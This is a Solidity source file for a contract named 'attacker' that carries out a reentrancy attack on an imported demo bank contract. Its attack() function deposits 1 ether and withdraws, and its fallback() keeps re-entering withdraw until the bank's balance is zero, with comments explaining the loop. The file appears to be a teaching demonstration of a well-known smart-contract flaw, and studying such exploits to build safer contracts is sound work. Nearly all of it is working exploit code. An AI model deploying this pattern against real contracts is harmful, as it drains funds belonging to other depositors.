// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
import "./bank.sol";

contract attacker{

    globalIMEBank public bank;

    // creating a constructor of bank address as a payable for easy interact.
    constructor(address _bank) payable {
        bank = globalIMEBank(_bank);
    }

    // So once the balance is deposited into the smart contract, automatically fallback() function is called.
    // And it will create a loop and transfer all the balances to the attacker untill the bank balance is equles to 0.
    
    fallback() external payable {
        if(address(bank).balance > 0){
            bank.withdraw();
        }
    }

    
    // Attack function will deposite 1 ether to the bank and instently call the withdraw function
    // once the withdraw function is success, automatically fallback() function is called.
    function attack() external payable{
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }


}
